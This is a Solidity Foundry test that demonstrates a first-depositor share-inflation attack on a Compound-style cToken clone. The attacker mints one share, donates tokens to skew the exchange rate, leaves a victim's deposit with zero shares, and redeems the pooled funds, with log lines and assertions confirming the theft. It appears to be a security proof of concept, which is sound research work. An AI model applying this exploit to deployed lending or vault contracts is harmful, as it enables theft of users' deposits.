// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Token.sol";
import "../src/CErc20Clone.sol";

contract AttackTest is Test {
    Token token;
    CErc20Clone cToken;
    address attacker;
    address user;

    function setUp() public {
        attacker = address(1);
        user = address(2);
        token = new Token();
        cToken = new CErc20Clone(address(token));
    }

    function testAttack() public {
        vm.label(attacker, "Attacker");
        vm.label(user, "User");
        vm.deal(attacker, 1 ether);
        vm.deal(user, 1 ether);

        token.transfer(attacker, 5000);
        token.transfer(user, 5000);

        vm.startPrank(attacker);
        token.approve(address(cToken), 5000);
        vm.stopPrank();

        vm.startPrank(user);
        token.approve(address(cToken), 5000);
        vm.stopPrank();
         
        console2.log(
            "[STATE]                Underlying balance of CToken",
            token.balanceOf(address(cToken))
        );

        // Attacker mints the smallest possible amount of CTokens
        vm.startPrank(attacker);
        cToken.mint(attacker, 1);
        vm.stopPrank();
        console2.log(
            "[STATE]              Attacker token balance:",
            token.balanceOf(attacker)
        );
        console2.log(
            "[STATE]              Attacker CToken balance:",
            cToken.accountTokens(attacker)
        );

        // Attacker artificially inflates the underlying balance of the CToken
        console2.log(
            "[ATTACKER]           Attacker transfers token directly, inflating the underlying balance of CToken."
        );
        vm.startPrank(attacker);
        token.transfer(address(cToken), 1000);
        vm.stopPrank();
        console2.log(
            "[STATE]              Underlying balance of CToken after inflation",
            token.balanceOf(address(cToken))
        );

        // User attempts to deposit but gets 0 CTokens due to manipulated exchange rate
        console2.log(
            "[STATE]              User balance before mint",
            token.balanceOf(user)
        );
        vm.startPrank(user);
        cToken.mint(user, 500);
        vm.stopPrank();
        console2.log(
            "[USER]               User attempted to mint 500 tokens"
        );
        console2.log(
            "[STATE]              User CToken balance after mint attempt",
            cToken.accountTokens(user)
        );

        assertEq(
            cToken.accountTokens(user),
            0,
            "User should receive 0 CTokens"
        );

        // Attacker redeems his CTokens for all the underlying tokens
        console2.log("[ATTACKER]           Attacker redeems his CTokens");
        vm.startPrank(attacker);
        cToken.redeem(attacker);
        vm.stopPrank();

        uint256 attackerBalance = token.balanceOf(attacker);
        assertTrue(attackerBalance > 1000, "Attacker should have stolen funds");

        console2.log(
            "[STATE]              Attacker balance:",
            attackerBalance
        );
        console2.log(
            "[STATE]              Attacker CToken balance:",
            cToken.accountTokens(attacker)
        );
    }
}